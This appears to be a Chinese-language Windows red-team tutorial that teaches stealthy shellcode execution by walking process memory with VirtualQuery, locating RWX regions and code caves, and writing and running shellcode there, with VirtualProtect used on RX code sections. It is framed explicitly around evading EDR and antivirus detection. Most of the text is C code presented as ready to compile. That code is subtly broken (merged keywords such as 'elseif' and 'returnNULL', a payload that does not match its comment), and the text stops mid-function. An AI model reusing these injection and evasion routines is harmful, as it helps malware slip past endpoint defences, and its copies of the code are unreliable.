---
title: 内存遍历实战：在现有内存中隐蔽执行ShellCode
url: https://mp.weixin.qq.com/s/3ntOClD-gx30tugNOoVIBw
source: Doonsec's feed
date: 2026-03-28
fetch_date: 2026-03-29T04:32:22.352177
---

# 内存遍历实战：在现有内存中隐蔽执行ShellCode

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/libkMqMibKDtUXm7e7YJibklMwEVEqpq0B9Q6cNI8iacFqnvFC3M4lU2wFkEJcq8mLyAmiat0YLOEhaTPkZDo9UpXpOs5lDASQ1vz58ZELjZH6ME/0?wx_fmt=jpeg)

# 内存遍历实战：在现有内存中隐蔽执行ShellCode

原创

星夜AI安全
星夜AI安全

星夜AI安全

![]()

在小说阅读器中沉浸阅读

在Windows内存攻防领域，如何隐蔽地执行ShellCode，绕开系统监控与检测，是很多技术研究者关注的核心话题。常规的内存分配方式容易触发监控，而通过遍历进程内存、利用现有可执行区域注入代码，成为一种更具隐蔽性的实现思路。

今天我们就来深入拆解这一技术，从内存机制基础到实战代码实现，再到免杀应用细节，带你完整掌握这一实用技巧。

## 一、先搞懂核心概念：内存管理与关键术语

要理解内存遍历执行ShellCode的逻辑，首先需要明确几个核心概念，避免陷入技术细节的迷雾中。

### 1.1 核心术语解析

| 术语 | 说明 |
| --- | --- |
| 内存页 | 内存管理的最小单位，Windows系统中通常为4KB，就像把内存划分为一个个固定大小的“小格子”，方便系统管理和分配。 |
| 内存区域 | 连续的内存页集合，这些页面具有相同的保护属性，是系统进行内存管理的基本单元。 |
| Code Cave（代码洞穴） | 可执行模块中未被使用的空间，比如PE文件中的对齐填充、节区间隙，可用于隐蔽注入代码而不改变文件体积。 |
| VirtualQuery | Windows系统提供的API，用于查询指定内存区域的详细信息，是内存遍历的核心工具。 |

### 1.2 关键内存保护属性

Windows系统通过内存保护属性限制对内存区域的操作，其中与ShellCode执行密切相关的属性如下（附核心宏定义）：

```
#define PAGE_NOACCESS          0x01   // 不可访问，任何操作都会触发异常
#define PAGE_READONLY          0x02   // 只读，仅能读取内容，无法修改
#define PAGE_READWRITE         0x04   // 可读写，能读取和修改，但无法执行代码
#define PAGE_EXECUTE           0x10   // 可执行，仅能执行代码，无法读取或修改
#define PAGE_EXECUTE_READ      0x20   // 可读可执行，最常见的代码段属性（如正常程序的.text段）
#define PAGE_EXECUTE_READWRITE 0x40   // 可读写可执行（RWX），能执行、读取、修改，隐蔽性差但操作便捷
#define PAGE_GUARD             0x100  // 保护页，用于触发异常通知
```

其中，RWX属性在正常软件中极其罕见，几乎是在向安全软件“暴露异常”，而RX属性则是合法程序代码段的常规属性，更具隐蔽性。

## 二、核心逻辑：为什么要遍历内存块执行ShellCode？

常规的ShellCode执行方式，通常会调用VirtualAlloc等API分配新的内存区域，再写入代码执行。但这种方式存在明显弊端——VirtualAlloc等敏感API往往被系统监控工具重点关注，容易被检测到异常。

而遍历内存块执行ShellCode，核心是“利用现有资源、避免新增操作”，其优势主要体现在三点：

1. 规避敏感API监控：不调用VirtualAlloc等易被检测的内存分配API，减少异常行为触发概率，降低被EDR、杀毒软件识别的风险。
2. 复用现有可执行内存：系统中存在大量已分配、具有可执行属性（X、RX、RWX）的内存区域，直接利用这些区域，无需新增内存，避免内存分配异常被捕捉。
3. Code Cave隐蔽注入：借助代码洞穴，将ShellCode注入到合法模块的未使用空间中，不影响原程序正常运行，同时实现代码的隐蔽执行，甚至可做到文件体积、哈希值不变，规避静态检测。

### 内存遍历的核心流程

整个技术的核心流程非常清晰，可概括为四步，无需复杂的逻辑设计：

1. 从内存地址0开始，作为遍历的起始点；
2. 调用VirtualQuery API，获取当前内存区域的详细信息（大小、保护属性、状态等）；
3. 检查该内存区域的属性，判断是否符合要求（已提交、具有可执行属性，且空间足够容纳ShellCode）；
4. 找到符合条件的区域后，写入ShellCode并执行，若未找到则继续遍历下一个区域。

## 三、实战实现：从内存遍历到ShellCode注入

下面通过三段核心代码，一步步实现从内存遍历、查找可执行区域，到最终注入执行ShellCode的完整流程，所有代码可直接编译运行（需基于Windows环境）。

### 3.1 遍历进程所有内存区域

首先实现内存遍历功能，打印当前进程所有已提交内存区域的地址、大小、状态和保护属性，直观了解进程内存分布：

```
#include <windows.h>
#include <stdio.h>

// 遍历当前进程的所有内存区域
void EnumerateMemory() {
    MEMORY_BASIC_INFORMATION mbi;
    LPVOID address = NULL;

    printf("%-20s %-12s %-12s %-20s\n",
           "Address", "Size", "State", "Protect");
    printf("%s\n", "---------------------------------------------------------------");

    // 循环遍历，直到VirtualQuery返回失败（遍历完成）
    while (VirtualQuery(address, &mbi, sizeof(mbi))) {
        char state[20] = "";
        char protect[30] = "";

        // 解析内存状态（已提交/已保留/空闲）
        switch (mbi.State) {
            case MEM_COMMIT:  strcpy(state, "COMMIT"); break;
            case MEM_RESERVE: strcpy(state, "RESERVE"); break;
            case MEM_FREE:    strcpy(state, "FREE"); break;
        }

        // 解析已提交内存的保护属性，简化显示
        if (mbi.State == MEM_COMMIT) {
            if (mbi.Protect & PAGE_EXECUTE_READWRITE)
                strcpy(protect, "RWX");
            elseif (mbi.Protect & PAGE_EXECUTE_READ)
                strcpy(protect, "RX");
            elseif (mbi.Protect & PAGE_EXECUTE)
                strcpy(protect, "X");
            elseif (mbi.Protect & PAGE_READWRITE)
                strcpy(protect, "RW");
            elseif (mbi.Protect & PAGE_READONLY)
                strcpy(protect, "R");
            else
                sprintf(protect, "0x%X", mbi.Protect);
        }

        // 只打印已提交的内存区域（可操作的有效内存）
        if (mbi.State == MEM_COMMIT) {
            printf("0x%p     0x%-10zX %-12s %-20s\n",
                   mbi.BaseAddress, mbi.RegionSize, state, protect);
        }

        // 移动到下一个内存区域
        address = (LPBYTE)mbi.BaseAddress + mbi.RegionSize;
    }
}

int main() {
    printf("========== 进程内存区域遍历 ==========\n");
    EnumerateMemory();
    return0;
}
```

运行后，会清晰看到进程中所有已提交内存的详细信息，比如哪些区域是RX属性（合法代码段），哪些是RWX属性（异常风险区域），为后续查找注入目标提供依据。

### 3.2 查找可执行内存区域（RWX + Code Cave）

遍历内存的核心目的，是找到可写入并执行ShellCode的区域，主要有两种思路：直接查找RWX区域，或查找Code Cave（代码洞穴），下面是完整实现：

```
#include <windows.h>
#include <stdio.h>

// 查找RWX（可读写可执行）内存区域
LPVOID FindRWXMemory(SIZE_T requiredSize) {
    MEMORY_BASIC_INFORMATION mbi;
    LPVOID address = NULL;

    printf("[*] 正在查找RWX内存区域...\n");

    while (VirtualQuery(address, &mbi, sizeof(mbi))) {
        // 条件：已提交、RWX属性、空间足够
        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect & PAGE_EXECUTE_READWRITE) &&
            mbi.RegionSize >= requiredSize) {

            printf("[+] 找到RWX区域：0x%p （大小：0x%zX）\n",
                   mbi.BaseAddress, mbi.RegionSize);
            return mbi.BaseAddress;
        }

        address = (LPBYTE)mbi.BaseAddress + mbi.RegionSize;
    }

    printf("[-] 未找到RWX内存区域\n");
    returnNULL;
}

// 查找Code Cave（代码洞穴）：可执行区域中的未使用空间
LPVOID FindCodeCave(SIZE_T requiredSize) {
    MEMORY_BASIC_INFORMATION mbi;
    LPVOID address = NULL;

    printf("[*] 正在查找代码洞穴...\n");

    while (VirtualQuery(address, &mbi, sizeof(mbi))) {
        // 条件：已提交、具有可执行属性（X/RX）
        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect & (PAGE_EXECUTE | PAGE_EXECUTE_READ))) {

            // 扫描内存区域末尾，寻找连续的空字节（0x00）或断点字节（0xCC）
            LPBYTE pScan = (LPBYTE)mbi.BaseAddress + mbi.RegionSize - requiredSize;
            BOOL allNull = TRUE;

            for (SIZE_T i = 0; i < requiredSize; i++) {
                if (pScan[i] != 0x00 && pScan[i] != 0xCC) {
                    allNull = FALSE;
                    break;
                }
            }

            // 找到符合条件的代码洞穴
            if (allNull) {
                printf("[+] 找到代码洞穴：0x%p\n", pScan);
                return pScan;
            }
        }

        address = (LPBYTE)mbi.BaseAddress + mbi.RegionSize;
    }

    printf("[-] 未找到可用代码洞穴\n");
    returnNULL;
}

int main() {
    // 示例ShellCode（4个int3断点 + 1个ret返回，用于测试）
    unsignedchar shellcode[] = "\xCC\xCC\xCC\xCC";
    SIZE_T shellcodeSize = sizeof(shellcode);

    // 方法1：查找RWX区域
    LPVOID pRWX = FindRWXMemory(shellcodeSize);
    if (pRWX) {
        printf("[*] 可将ShellCode写入RWX区域\n");
    }

    // 方法2：查找Code Cave（更隐蔽）
    LPVOID pCave = FindCodeCave(shellcodeSize);
    if (pCave) {
        printf("[*] 可利用代码洞穴注入ShellCode\n");
    }

    return0;
}
```

这里需要注意：RWX区域虽然操作便捷，但在现代系统中极其罕见，容易被安全软件检测；而Code Cave借助合法模块的未使用空间，隐蔽性更强，是更推荐的注入方式。

### 3.3 注入ShellCode并执行

找到合适的内存区域后，下一步就是写入ShellCode并执行。针对不同的内存属性（RWX、RX），需要采用不同的处理方式，完整实现如下：

```
#include <windows.h>
#include <stdio.h>

// 示例ShellCode：4个nop指令（空操作） + ret返回（避免程序崩溃）
unsignedchar shellcode[] = {
    0x90, 0x90, 0x90, 0x90,  // nop sled（用于对齐和规避简单检测）
    0xC3                     // ret（执行完成后返回，防止程序异常）
};

// 在现有内存模块中注入并执行ShellCode
BOOL InjectToExistingModule() {
    MEMORY_BASIC_INFORMATION mbi;
    LPVOID address = NULL;

    while (VirtualQuery(address, &mbi, sizeof(mbi))) {
        // 条件：已提交、空间足够容纳ShellCode
        if (mbi.State == MEM_COMMIT && mbi.RegionSize >= sizeof(shellcode)) {

            // 情况1：RWX属性，直接写入并执行
            if (mbi.Protect & PAGE_EXECUTE_READWRITE) {
                printf("[+] 找到RWX区域：0x%p\n", mbi.BaseAddress);

                // 写入ShellCode（memcpy直接复制）
                memcpy(mbi.BaseAddress, shellcode, sizeof(shellcode));
                printf("[+] ShellCode写入成功！\n");

                // 执行ShellCode（强制类型转换为函数指针并调用）
                ((void(*)())mbi.BaseAddress)();
                return TRUE;
            }

            // 情况2：RX属性（合法代码段），先修改保护属性再写入
            if (mbi.Protect & PAGE_EXECUTE_READ) {
                DWORD oldProtect;

                // 修改内存保护属性为RWX（临时）
                if (VirtualProtect(mbi.BaseAddress, sizeof(shellcode),
                                   PAGE_EXECUTE_READWRITE, &oldProtect)) {

                    printf("[+] 已修改内存保护属性：0x%p\n", mbi.BaseAddress);

                    // 写入ShellCode
                    memcpy(mbi.BaseAddress, shellcode, sizeof(shellcode));

                    // 恢复原保护属性...